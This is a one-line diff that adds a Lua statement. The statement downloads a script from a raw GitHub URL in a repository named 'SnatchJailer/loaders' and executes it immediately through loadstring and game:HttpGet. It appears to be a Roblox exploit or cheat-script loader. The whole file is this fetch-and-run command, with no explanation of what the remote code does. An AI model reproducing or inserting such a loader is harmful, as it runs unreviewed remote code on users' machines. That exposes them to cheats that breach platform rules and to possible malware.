@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/anniversary-daybreak-spam4-h1h9ansul1zbfi.lua"))()
